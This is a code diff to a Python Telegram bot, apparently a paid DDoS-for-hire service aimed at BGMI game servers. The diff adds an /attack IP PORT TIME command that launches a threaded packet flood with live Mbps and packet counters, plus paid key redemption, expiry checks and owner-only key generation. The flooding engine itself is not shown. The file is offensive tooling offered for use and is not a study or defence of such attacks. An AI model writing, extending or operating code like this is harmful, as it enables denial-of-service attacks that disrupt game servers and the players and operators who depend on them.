@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
-SERVER FREEZE BOT | COMPLETE FIXED
+SERVER FREEZE BOT | ALL WORKING FIXED
 """
 
 import asyncio, json, random, os, time, socket, threading, logging, string, uuid
@@ -109,10 +109,12 @@ def get_remaining(expiry_str):
         days = diff.days
         hours = diff.seconds // 3600
         minutes = (diff.seconds % 3600) // 60
+        seconds = diff.seconds % 60
         if days > 30: return f"{days//30}M+", False
-        elif days > 0: return f"{days}D {hours}H", False
-        elif hours > 0: return f"{hours}H {minutes}M", False
-        else: return f"{minutes}M", False
+        elif days > 0: return f"{days}D {hours}H {minutes}M", False
+        elif hours > 0: return f"{hours}H {minutes}M {seconds}S", False
+        elif minutes > 0: return f"{minutes}M {seconds}S", False
+        else: return f"{seconds}S", False
     except: return "ERROR", False
 
 # ═══════════════ SETTINGS FUNCTIONS ═══════════════
@@ -485,7 +487,7 @@ def premium_text(text, style_num=1):
     styled = styles.get(style_num, style1_smallcaps)(text)
     return f"˹{styled}˼"
 
-# ═══════════════ BUTTONS - EXACT CALLBACK MATCH ═══════════════
+# ═══════════════ BUTTONS ═══════════════
 def menu_back_kb():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton(f"⌂ {premium_text('MENU', 5)}", callback_data="menu"),
@@ -599,6 +601,8 @@ def get_commands_list(is_owner=False):
 /attack - ⚔ {premium_text('ATTACK START KAREIN', 2)}  
 /stop - ⛔ {premium_text('ATTACK STOP KAREIN', 3)}
 /redeem - ⚿ {premium_text('KEY REDEEM KAREIN', 4)}
+/status - 📊 {premium_text('STATUS CHECK KAREIN', 5)}
+/commands - 📝 {premium_text('COMMANDS DEKHEIN', 1)}
 
 ╔══════════════════════════════════════╗
 ║      🎯 {premium_text('ATTACK HELP', 2)}              ║
@@ -863,6 +867,117 @@ async def simple_start(client, msg):
 async def start_cmd(client, msg):
     await welcome_animation(client, msg)
 
+# ═══════════════ ADDSTOP COMMAND - PREMIUM ═══════════════
+@app.on_message(filters.command("addstop") & filters.private)
+async def addstop_cmd(client, msg):
+    """🔥 Premium Addstop Command - Sticker + Message"""
+    try:
+        # 🔥 PEHLE STICKER SEND KARO
+        sticker_id = get_random_sticker()
+        sticker_msg = None
+        if sticker_id:
+            try:
+                sticker_msg = await msg.reply_sticker(sticker_id)
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        
+        # 🔥 STICKER DELETE KARO
+        if sticker_msg:
+            try:
+                await sticker_msg.delete()
+            except:
+                pass
+        
+        # 🔥 PHIR MESSAGE SEND KARO
+        await msg.reply_text(
+            f"⛔ **{premium_text('NO ATTACK RUNNING', 5)}**\n\n"
+            f"✅ {premium_text('Everything is peaceful!', 1)}\n\n"
+            f"⚔️ {premium_text('Use /attack IP PORT TIME to start', 3)}\n\n"
+            f"🛡️ {premium_text('Your bot is safe and secure!', 4)}\n\n"
+            f"{LINE}\n"
+            f"💡 {premium_text('Tip:', 5)} {premium_text('Attack only on BGMI servers', 2)}"
+        )
+    except Exception as e:
+        logger.error(f"Addstop error: {e}")
+        await msg.reply_text(
+            f"⛔ {premium_text('NO ATTACK RUNNING', 5)}\n\n"
+            f"✅ {premium_text('Everything is peaceful!', 1)}"
+        )
+
+# ═══════════════ STOP COMMAND - WITH ADDSTOP FEATURE ═══════════════
+@app.on_message(filters.command("stop"))
+async def stop_cmd(client, msg):
+    global attacking
+    uid = msg.from_user.id
+    
+    # 🔥 CHECK ACCESS
+    if not check_access(uid)[0]:
+        # 🔥 SEND STICKER FIRST
+        sticker_id = get_random_sticker()
+        sticker_msg = None
+        if sticker_id:
+            try:
+                sticker_msg = await msg.reply_sticker(sticker_id)
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        if sticker_msg:
+            try:
+                await sticker_msg.delete()
+            except:
+                pass
+        await msg.reply_text(f"🔒 {premium_text('ACCESS DENIED', 5)}\n\n👑 {premium_text('Contact owner for access', 1)}")
+        return
+    
+    # 🔥 IF ATTACK IS RUNNING
+    if attacking:
+        attacker.on = False
+        attacking = False
+        
+        # 🔥 SEND STICKER
+        sticker_id = get_random_sticker()
+        sticker_msg = None
+        if sticker_id:
+            try:
+                sticker_msg = await msg.reply_sticker(sticker_id)
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        if sticker_msg:
+            try:
+                await sticker_msg.delete()
+            except:
+                pass
+        
+        vid = rand_vid()
+        text = f"⛔ **{premium_text('ATTACK STOPPED', 5)}**\n\n📦 {attacker.pkts:,} {premium_text('packets', 1)}\n\n🔄 /attack IP PORT TIME"
+        await send_vid(msg.chat.id, text, None, vid)
+    else:
+        # 🔥 IF NO ATTACK - ADDSTOP FEATURE
+        sticker_id = get_random_sticker()
+        sticker_msg = None
+        if sticker_id:
+            try:
+                sticker_msg = await msg.reply_sticker(sticker_id)
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        if sticker_msg:
+            try:
+                await sticker_msg.delete()
+            except:
+                pass
+        
+        await msg.reply_text(
+            f"⛔ **{premium_text('NO ATTACK RUNNING', 5)}**\n\n"
+            f"✅ {premium_text('Everything is peaceful!', 1)}\n\n"
+            f"⚔️ {premium_text('Use /attack IP PORT TIME to start', 3)}\n\n"
+            f"🛡️ {premium_text('Your bot is safe and secure!', 4)}\n\n"
+            f"{LINE}\n"
+            f"💡 {premium_text('Tip:', 5)} {premium_text('Attack only on BGMI servers', 2)}"
+        )
+
 # ═══════════════ STATUS COMMAND ═══════════════
 @app.on_message(filters.command("status"))
 async def status_cmd(client, msg):
@@ -870,10 +985,15 @@ async def status_cmd(client, msg):
     
     if not check_access(uid)[0]:
         sticker_id = get_random_sticker()
+        sticker_msg = None
         if sticker_id:
             try:
                 sticker_msg = await msg.reply_sticker(sticker_id)
                 await asyncio.sleep(0.5)
+            except:
+                pass
+        if sticker_msg:
+            try:
                 await sticker_msg.delete()
             except:
                 pass
@@ -884,19 +1004,37 @@ async def status_cmd(client, msg):
     history = get_user_history(uid)
     
     sticker_id = get_random_sticker()
+    sticker_msg = None
     if sticker_id:
         try:
             sticker_msg = await msg.reply_sticker(sticker_id)
             await asyncio.sleep(0.5)
+        except:
+            pass
+    if sticker_msg:
+        try:
             await sticker_msg.delete()
         except:
             pass
+    
+    # 🔥 REAL-TIME REMAINING TIME
+    remaining_text = "N/A"
+    if info.get("remaining"):
+        remaining_text = info["remaining"]
     
     text = f"📊 **{premium_text('STATUS', 5)}**\n\n{LINE}\n"
     text += f"👤 {msg.from_user.first_name}\n"
     text += f"🆔 {uid}\n"
     text += f"💳 {info['type']}\n"
-    if info.get("remaining"): text += f"⏳ {premium_text('Remaining:', 3)} {info['remaining']}\n"
+    if info.get("remaining"): 
+        # 🔥 SHOW REAL-TIME REMAINING WITH SECONDS
+        if "KEY" in info['type']:
+            uk = get_users().get("keys", {}).get(str(uid), {})
+            if uk:
+                rem, _ = get_remaining(uk["expiry"])
+                text += f"⏳ {premium_text('Remaining:', 3)} {rem}\n"
+        else:
+            text += f"⏳ {premium_text('Remaining:', 3)} {info['remaining']}\n"
     if info.get("expiry"):
         try:
             exp = datetime.fromisoformat(info["expiry"])
@@ -908,6 +1046,10 @@ async def status_cmd(client, msg):
     text += f"📹 {premium_text('Videos:', 3)} {len(get_vids())}\n"
     text += f"{LINE}\n"
     text += f"🟢 {premium_text('Attack:', 3)} {'🟢 ON' if attacking else '💤 OFF'}\n"
+    if attacking:
+        e = time.time() - ainfo['start']
+        text += f"⏱️ {premium_text('Running:', 3)} {int(e)}s\n"
+        text += f"📦 {premium_text('Packets:', 3)} {attacker.pkts:,}\n"
     text += f"{LINE}\n"
     text += f"📊 {premium_text('History:', 3)}\n"
     if history:
@@ -921,18 +1063,363 @@ async def status_cmd(client, msg):
     
     await msg.reply_text(text)
 
-# ═══════════════ CALLBACKS - ALL WORKING ═══════════════
+# ═══════════════ EMOJI ADD COMMAND ═══════════════
+@app.on_message(filters.command("addemoji") & filters.private)
+async def add_emoji_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    if not msg.reply_to_message:
+        return await msg.reply_text(
+            f"⎘ **{premium_text('ADD EMOJI', 5)}**\n\n"
+            f"{premium_text('Reply to a premium emoji with:', 3)}\n"
+            "`/addemoji`\n\n"
+            f"✨ {premium_text('The emoji will be added to welcome animation!', 1)}"
+        )
+    
+    emoji_id = None
+    
+    if msg.reply_to_message.sticker:
+        emoji_id = msg.reply_to_message.sticker.file_id
+    elif hasattr(msg.reply_to_message, 'custom_emoji_id') and msg.reply_to_message.custom_emoji_id:
+        emoji_id = msg.reply_to_message.custom_emoji_id
+    
+    if emoji_id:
+        success, total = add_emoji(emoji_id)
+        if success:
+            await msg.reply_text(
+                f"✅ **{premium_text('EMOJI ADDED', 5)}** 🎉\n\n"
+                f"🔹 {premium_text('Total Emojis:', 3)} {total}\n\n"
+                f"✨ {premium_text('This emoji will appear randomly in welcome animation!', 1)}"
+            )
+        else:
+            await msg.reply_text(f"❌ {premium_text('This emoji is already in the list!', 5)}")
+    else:
+        await msg.reply_text(
+            f"❌ **{premium_text('No emoji found!', 5)}**\n\n"
+            f"{premium_text('Please reply to a premium emoji or sticker.', 1)}"
+        )
+
+# ═══════════════ STICKER ADD COMMAND ═══════════════
+@app.on_message(filters.command("addsticker") & filters.private)
+async def add_sticker_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    if not msg.reply_to_message:
+        return await msg.reply_text(
+            f"⎘ **{premium_text('ADD STICKER', 5)}**\n\n"
+            f"{premium_text('Reply to a sticker with:', 3)}\n"
+            "`/addsticker`\n\n"
+            f"✨ {premium_text('The sticker will appear randomly in welcome animation!', 1)}\n\n"
+            f"⏱️ {premium_text('Default Sticker Time:', 3)} {get_sticker_display_time()}s"
+        )
+    
+    if not msg.reply_to_message.sticker:
+        return await msg.reply_text(f"❌ {premium_text('Please reply to a sticker!', 5)}")
+    
+    sticker_id = msg.reply_to_message.sticker.file_id
+    
+    duration = get_sticker_display_time()
+    try:
+        if hasattr(msg.reply_to_message.sticker, 'duration'):
+            duration = msg.reply_to_message.sticker.duration
+        elif hasattr(msg.reply_to_message.sticker, 'emoji'):
+            sticker_obj = msg.reply_to_message.sticker
+            if hasattr(sticker_obj, 'duration'):
+                duration = sticker_obj.duration
+    except:
+        duration = get_sticker_display_time()
+    
+    if duration < 2:
+        duration = get_sticker_display_time()
+    
+    success, total = add_sticker(sticker_id, duration)
+    
+    if success:
+        await msg.reply_text(
+            f"✅ **{premium_text('STICKER ADDED', 5)}** 🎉\n\n"
+            f"🔹 {premium_text('Total Stickers:', 3)} {total}\n"
+            f"⏱️ **{premium_text('Duration:', 3)}** {duration} {premium_text('seconds', 1)}\n\n"
+            f"✨ {premium_text('This sticker will appear randomly in welcome animation!', 2)}\n"
+            f"📋 {premium_text('Current Settings:', 3)}\n"
+            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
+            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
+        )
+    else:
+        await msg.reply_text(f"❌ {premium_text('This sticker is already in the list!', 5)}")
+
+# ═══════════════ ATTACK ═══════════════
+@app.on_message(filters.command("attack"))
+async def attack_cmd(client, msg):
+    global attacking, ainfo, amsg, attack_user
+    uid = msg.from_user.id
+    
+    checking_msg = await msg.reply_text(
+        f"🔍 **{premium_text('INITIATING SECURITY PROTOCOL', 5)}...**\n\n"
+        f"▫️ {premium_text('Connecting to secure server...', 1)}\n"
+        f"▫️ {premium_text('Validating credentials...', 2)}\n"
+        f"▫️ {premium_text('Checking subscription status...', 3)}"
+    )
+    
+    await asyncio.sleep(0.5)
+    
+    if is_blocked(uid):
+        await checking_msg.edit_text(
+            f"🚫 **{premium_text('ACCESS DENIED', 5)}**\n\n"
+            "╔═══════════════════════╗\n"
+            f"║  ❌ {premium_text('USER BLOCKED', 5)}      ║\n"
+            f"║  🔒 {premium_text('Security Violation', 3)} ║\n"
+            "╚═══════════════════════╝\n\n"
+            f"{premium_text('Your access has been revoked.', 1)}\n"
+            f"{premium_text('Contact owner for appeal.', 2)}"
+        )
+        return
+    
+    await checking_msg.edit_text(
+        f"🔍 **{premium_text('SCANNING USER DATABASE', 5)}...**\n\n"
+        f"▫️ {premium_text('User ID:', 3)} `{uid}`\n"
+        f"▫️ {premium_text('Status:', 3)} {premium_text('Analyzing...', 1)}\n"
+        f"▫️ {premium_text('Security Level:', 3)} ⚡⚡⚡\n"
+        f"▫️ 🔐 {premium_text('Authentication in progress...', 2)}"
+    )
+    
+    await asyncio.sleep(0.5)
+    
+    if uid == OWNER_ID:
+        await checking_msg.edit_text(
+            f"⚜ **{premium_text('MASTER ACCESS GRANTED', 5)}**\n\n"
+            "╔══════════════════════════╗\n"
+            f"║  ✅ {premium_text('OWNER VERIFIED', 5)}       ║\n"
+            f"║  🛡️ {premium_text('Unlimited Access', 3)}     ║\n"
+            f"║  🚀 {premium_text('Super Admin Rights', 3)}   ║\n"
+            "╚══════════════════════════╝\n\n"
+            f"{premium_text('Welcome back, Master!', 5)} 🫡\n"
+            f"{premium_text('Initiating attack sequence...', 1)}"
+        )
+        await asyncio.sleep(0.5)
+        await checking_msg.delete()
+        await execute_attack(client, msg, uid)
+        return
+    
+    u = get_users()
+    if str(uid) in u.get("premium", []):
+        await checking_msg.edit_text(
+            f"💎 **{premium_text('PREMIUM ACCESS GRANTED', 5)}**\n\n"
+            "╔══════════════════════════╗\n"
+            f"║  ✅ {premium_text('SUBSCRIPTION ACTIVE', 5)}  ║\n"
+            f"║  💎 {premium_text('Premium User', 3)}        ║\n"
+            f"║  🚀 {premium_text('Full Power Access', 3)}   ║\n"
+            "╚══════════════════════════╝\n\n"
+            f"{premium_text('Access granted! Launching attack...', 1)} 🚀"
+        )
+        await asyncio.sleep(0.5)
+        await checking_msg.delete()
+        await execute_attack(client, msg, uid)
+        return
+    
+    await checking_msg.edit_text(
+        f"🔍 **{premium_text('CHECKING KEY DATABASE', 5)}...**\n\n"
+        f"▫️ {premium_text('Searching for active keys...', 1)}\n"
+        f"▫️ 🔑 {premium_text('Key validation in progress...', 2)}\n"
+        f"▫️ {premium_text('Decrypting access tokens...', 3)}"
+    )
+    
+    await asyncio.sleep(0.5)
+    
+    uk = u.get("keys", {}).get(str(uid), {})
+    if uk:
+        try:
+            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
+                remaining, _ = get_remaining(uk["expiry"])
+                await checking_msg.edit_text(
+                    f"⚿ **{premium_text('KEY ACCESS GRANTED', 5)}**\n\n"
+                    "╔══════════════════════════╗\n"
+                    f"║  ✅ {premium_text('KEY VERIFIED', 5)}         ║\n"
+                    f"║  ⏱️ {premium_text('Remaining:', 3)} {remaining} ║\n"
+                    f"║  🚀 {premium_text('Access Granted', 3)}      ║\n"
+                    "╚══════════════════════════╝\n\n"
+                    f"{premium_text('Key accepted! Preparing attack...', 1)} ⚡"
+                )
+                await asyncio.sleep(0.5)
+                await checking_msg.delete()
+                await execute_attack(client, msg, uid)
+                return
+            else:
+                del u["keys"][str(uid)]
+                jsave(USERS_DB, u)
+                await checking_msg.edit_text(
+                    f"⛔ **{premium_text('ACCESS DENIED', 5)}**\n\n"
+                    "╔══════════════════════════╗\n"
+                    f"║  ❌ {premium_text('KEY EXPIRED', 5)}          ║\n"
+                    f"║  ⏰ {premium_text('Time\'s Up!', 3)}           ║\n"
+                    f"║  🔒 {premium_text('Access Revoked', 3)}      ║\n"
+                    "╚══════════════════════════╝\n\n"
+                    f"{premium_text('Your key has expired.', 1)}\n"
+                    f"{premium_text('Please purchase a new key!', 2)}\n\n"
+                    f"📲 {premium_text('Contact:', 3)} [FATHER OF BOT]({OWNER_LINK})"
+                )
+                return
+        except:
+            pass
+    
+    await checking_msg.edit_text(
+        f"⛔ **{premium_text('ACCESS DENIED', 5)}**\n\n"
+        "╔══════════════════════════╗\n"
+        f"║  ❌ {premium_text('NO ACTIVE PLAN', 5)}       ║\n"
+        f"║  🔒 {premium_text('Subscription Required', 3)} ║\n"
+        f"║  🚫 {premium_text('Access Blocked', 3)}       ║\n"
+        "╚══════════════════════════╝\n\n"
+        f"🔑 **{premium_text('You don\'t have any active plan!', 5)}**\n\n"
+        f"{premium_text('To get access:', 3)}\n"
+        f"• {premium_text('Buy a key from the owner', 1)}\n"
+        f"• {premium_text('Redeem your key using /redeem', 2)}\n"
+        f"• {premium_text('Get premium access', 3)}\n\n"
+        f"👑 {premium_text('Contact:', 3)} [FATHER OF BOT]({OWNER_LINK})\n"
+        f"🛒 {premium_text('For Key Purchase:', 3)} @FathersOfCreater"
+    )
+
+async def execute_attack(client, msg, uid):
+    global attacking, ainfo, amsg, attack_user
+    
+    parts = msg.text.split()
+    if len(parts) < 4:
+        await msg.reply_text(f"⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 600")
+        return
+    
+    if attacking:
+        e = time.time() - ainfo['start']
+        await msg.reply_text(f"⚠️ {premium_text('Already attacking!', 5)} {int(e)}s\n🛑 {premium_text('Use Stop button', 3)}")
+        return
+    
+    ip = parts[1]
+    try: port = int(parts[2])
+    except: 
+        await msg.reply_text(f"❌ {premium_text('Invalid port!', 5)}")
+        return
+    try: dur = int(parts[3])
+    except: 
+        await msg.reply_text(f"❌ {premium_text('Invalid time!', 5)}")
+        return
+    
+    info = get_user_info(uid)
+    threads = info['threads']
+    max_t = info['max_time']
+    if dur > max_t: 
+        dur = max_t
+    
+    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
+    attacking = True
+    attack_user = uid
+    
+    vid = rand_vid()
+    text = (
+        f"💀 **{premium_text('ATTACK LAUNCHED', 5)}**\n\n"
+        "╔══════════════════════════╗\n"
+        f"║ 🎯 {premium_text('Target:', 3)} {ip}:{port}     ║\n"
+        f"║ ⏱️ {premium_text('Duration:', 3)} {dur}s        ║\n"
+        f"║ 🧵 {premium_text('Threads:', 3)} {threads}     ║\n"
+        f"║ 👤 {premium_text('User:', 3)} {uid}         ║\n"
+        "╚══════════════════════════╝\n\n"
+        f"⚡ {premium_text('System compromised!', 5)}\n"
+        f"🔴 {premium_text('Attack in progress...', 1)}"
+    )
+    amsg = await send_vid(msg.chat.id, text, None, vid)
+    add_history(uid, "ATTACK START", f"{ip}:{port} | {dur}s")
+    
+    async def live():
+        t0 = time.time()
+        while attacking:
+            await asyncio.sleep(2)
+            try:
+                e = time.time() - t0
+                if e >= dur: break
+                pct = (e/dur)*100
+                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
+                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
+                await amsg.edit_text(
+                    f"💀 **{premium_text('ATTACKING', 5)}**\n\n"
+                    f"╔══════════════════════════╗\n"
+                    f"║ 🎯 {ip}:{port}              ║\n"
+                    f"║ ⏱️ {int(e)}s / {dur}s        ║\n"
+                    f"║ 📊 [{bar}] {pct:.0f}%      ║\n"
+                    f"║ 📦 {attacker.pkts:,} {premium_text('pkts', 1)}  ║\n"
+                    f"║ 📶 {mbps:.1f} Mbps          ║\n"
+                    "╚══════════════════════════╝\n\n"
+                    f"🛑 {premium_text('Press STOP to abort', 3)}"
+                )
+            except: pass
+    
+    asyncio.create_task(live())
+    
+    loop = asyncio.get_event_loop()
+    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
+    attacking = False
+    attack_user = None
+    
+    add_history(uid, "ATTACK END", f"{ip}:{port} | {stats['pkts']:,} pkts")
+    
+    vid = rand_vid()
+    done = (
+        f"✅ **{premium_text('ATTACK COMPLETED', 5)}**\n\n"
+        "╔══════════════════════════╗\n"
+        f"║ 🎯 {ip}:{port}              ║\n"
+        f"║ 📦 {stats['pkts']:,} {premium_text('pkts', 1)}  ║\n"
+        f"║ 📶 {stats['mbps']:.1f} Mbps║\n"
+        f"║ ⏱️ {dur}s {premium_text('Completed', 3)}      ║\n"
+        "╚══════════════════════════╝\n\n"
+        "🔄 /attack IP PORT TIME"
+    )
+    if vid and os.path.exists(vid["path"]):
+        await app.send_video(msg.chat.id, vid["path"], caption=done)
+    try: 
+        await amsg.edit_text(done)
+    except: 
+        pass
+
+# ═══════════════ REDEEM ═══════════════
+@app.on_message(filters.command("redeem"))
+async def redeem_cmd(client, msg):
+    uid = msg.from_user.id
+    access, a_type = check_access(uid)
+    if access:
+        info = get_user_info(uid)
+        return await msg.reply_text(f"✅ {premium_text('ALREADY UNLOCKED', 5)}\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\n{premium_text('Use /start for menu', 3)}")
+    
+    parts = msg.text.split()
+    if len(parts) != 2:
+        return await msg.reply_text(f"⚿ {premium_text('REDEEM KEY', 5)}\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})")
+    
+    key = parts[1].upper()
+    success, result = redeem_key_code(key, uid)
+    
+    if success:
+        vid = rand_vid()
+        text = f"🎉 {premium_text('KEY REDEEMED', 5)}\n\n{LINE}\n🔑 {premium_text('Key:', 3)} {key[:20]}...\n📅 {premium_text('Expires:', 3)} {result}\n{LINE}\n\n🔓 {premium_text('Access granted!', 5)}\n📋 {premium_text('Send /start', 3)}"
+        await send_vid(msg.chat.id, text, None, vid)
+    else:
+        await msg.reply_text(f"❌ {result}\n\n📲 [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})")
+
+# ═══════════════ COMMANDS COMMAND ═══════════════
+@app.on_message(filters.command("commands"))
+async def commands_cmd(client, msg):
+    uid = msg.from_user.id
+    is_owner = (uid == OWNER_ID)
+    commands_text = get_commands_list(is_owner)
+    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
+    await msg.reply_text(formatted_text, reply_markup=menu_back_kb())
+
+# ═══════════════ CALLBACKS ═══════════════
 @app.on_callback_query()
 async def callbacks(client, cb: CallbackQuery):
     data = cb.data
     uid = cb.from_user.id
     
-    # ========== SEPARATOR ==========
     if data == "sep":
         await cb.answer()
         return
     
-    # ========== STOP ATTACK ==========
+    # ══════════ STOP ATTACK ══════════
     if data == "stop_attack":
         global attacking
         if attacking and (uid == attack_user or uid == OWNER_ID):
@@ -944,27 +1431,28 @@ async def callbacks(client, cb: CallbackQuery):
             try: await cb.message.delete()
             except: pass
         else:
-            sticker_id = get_random_sticker()
-            if sticker_id:
-                try:
-                    sticker_msg = await cb.message.reply_sticker(sticker_id)
-                    await asyncio.sleep(0.5)
-                    await sticker_msg.delete()
-                except:
-                    pass
-            await cb.answer("💤 No attack running!", show_alert=True)
+            await cb.answer(f"💤 {premium_text('NO ATTACK RUNNING', 5)}", show_alert=True)
         return
     
-    # ========== STATUS BUTTON ==========
+    # ══════════ STATUS ══════════
     if data == "status_btn":
         if attacking:
             e = time.time() - ainfo['start']
-            await cb.answer(f"🟢 {premium_text('ATTACKING', 5)}\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} {premium_text('pkts', 1)}", show_alert=True)
+            await cb.answer(
+                f"🟢 {premium_text('ATTACKING', 5)}\n"
+                f"⏱️ {int(e)}s\n"
+                f"📦 {attacker.pkts:,} {premium_text('pkts', 1)}",
+                show_alert=True
+            )
         else:
-            await cb.answer(f"💤 {premium_text('IDLE', 5)}\n\n{premium_text('No attack running', 1)}", show_alert=True)
+            await cb.answer(
+                f"💤 {premium_text('IDLE', 5)}\n\n"
+                f"✅ {premium_text('No attack running', 1)}",
+                show_alert=True
+            )
         return
     
-    # ========== REDEEM POPUP ==========
+    # ══════════ REDEEM POPUP ══════════
     if data == "redeem_popup":
         await cb.answer(
             f"🪪 {premium_text('About Redeem', 5)} ♡\n\n"
@@ -982,7 +1470,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== COMMANDS MENU ==========
+    # ══════════ COMMANDS MENU ══════════
     if data == "commands_menu":
         is_owner = (uid == OWNER_ID)
         commands_text = get_commands_list(is_owner)
@@ -990,7 +1478,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(formatted_text, reply_markup=menu_back_kb())
         return
     
-    # ========== MENU ==========
+    # ══════════ MENU ══════════
     if data == "menu":
         await cb.answer(f"⌂ {premium_text('GOING TO MENU', 5)}")
         user = cb.from_user
@@ -1030,7 +1518,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=kb)
         return
     
-    # ========== BACK ==========
+    # ══════════ BACK ══════════
     if data == "back":
         user = cb.from_user
         uid = user.id
@@ -1069,7 +1557,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=kb)
         return
     
-    # ========== ATTACK MENU ==========
+    # ══════════ ATTACK MENU ══════════
     if data == "attack_menu":
         uid = cb.from_user.id
         
@@ -1117,7 +1605,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== INFO MENU ==========
+    # ══════════ INFO MENU ══════════
     if data == "info_menu":
         info = get_user_info(uid)
         history = get_user_history(uid)
@@ -1141,7 +1629,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=menu_back_kb())
         return
     
-    # ========== REDEEM MENU ==========
+    # ══════════ REDEEM MENU ══════════
     if data == "redeem_menu":
         access, a_type = check_access(uid)
         if access:
@@ -1159,7 +1647,7 @@ async def callbacks(client, cb: CallbackQuery):
             )
         return
     
-    # ========== ADMIN PANEL ==========
+    # ══════════ ADMIN PANEL ══════════
     if data == "admin_menu":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1167,7 +1655,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(f"⚜ **{premium_text('ADMIN PANEL', 5)}**\n\n🔽 {premium_text('Select:', 3)}", reply_markup=admin_kb())
         return
     
-    # ========== BACK ADMIN ==========
+    # ══════════ BACK ADMIN ══════════
     if data == "back_admin":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1175,7 +1663,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(f"⚜ **{premium_text('ADMIN PANEL', 5)}**\n\n🔽 {premium_text('Select:', 3)}", reply_markup=admin_kb())
         return
     
-    # ========== ADMIN AUTO ==========
+    # ══════════ ADMIN AUTO ══════════
     if data == "admin_auto":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1183,7 +1671,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(f"⚜ **{premium_text('AUTO GEN KEY', 5)}**\n\n{LINE}\n🔽 {premium_text('Select Duration:', 3)}", reply_markup=auto_key_kb())
         return
     
-    # ========== AUTO KEY GENERATION ==========
+    # ══════════ AUTO KEY GENERATION ══════════
     auto_keys = {
         "ak_20m": ("20min", "20m"), "ak_40m": ("40min", "40m"), "ak_60m": ("60min", "60m"),
         "ak_1d": ("1day", "1d"), "ak_3d": ("3day", "3d"), "ak_7d": ("7day", "7d"),
@@ -1203,7 +1691,7 @@ async def callbacks(client, cb: CallbackQuery):
             await cb.answer("❌ Failed!", show_alert=True)
         return
     
-    # ========== ADMIN ADDKEY ==========
+    # ══════════ ADMIN ADDKEY ══════════
     if data == "admin_addkey":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1211,7 +1699,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.answer(f"⚿ {premium_text('ADD KEY', 5)}\n\n{premium_text('Use:', 3)} /genkey NAME TIME\n\n{premium_text('Examples:', 3)}\n/genkey Test 30m\n/genkey VIP 24h\n/genkey Premium 7d\n\n{premium_text('Units:', 3)} m=min, h=hour, d=day, w=week, mo=month", show_alert=True)
         return
     
-    # ========== ADMIN KEYS ==========
+    # ══════════ ADMIN KEYS ══════════
     if data == "admin_keys":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1222,7 +1710,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(f"⌘ **{premium_text('ALL KEYS', 5)}**\n\n{LINE}\n🟢 {premium_text('Active:', 3)} {len(active)}\n🔴 {premium_text('Used:', 3)} {len(used)}\n{LINE}", reply_markup=admin_kb())
         return
     
-    # ========== ADMIN STATS ==========
+    # ══════════ ADMIN STATS ══════════
     if data == "admin_stats":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1243,7 +1731,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== ADMIN CLEAR ==========
+    # ══════════ ADMIN CLEAR ══════════
     if data == "admin_clear":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1252,7 +1740,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.answer(f"↺ {removed} {premium_text('expired removed!', 1)}", show_alert=True)
         return
     
-    # ========== VIDEO MANAGER ==========
+    # ══════════ VIDEO MANAGER ══════════
     if data == "video_menu":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1273,7 +1761,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== VIDEO ADD ==========
+    # ══════════ VIDEO ADD ══════════
     if data == "v_add":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1287,7 +1775,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== VIDEO DELETE ==========
+    # ══════════ VIDEO DELETE ══════════
     if data == "v_del":
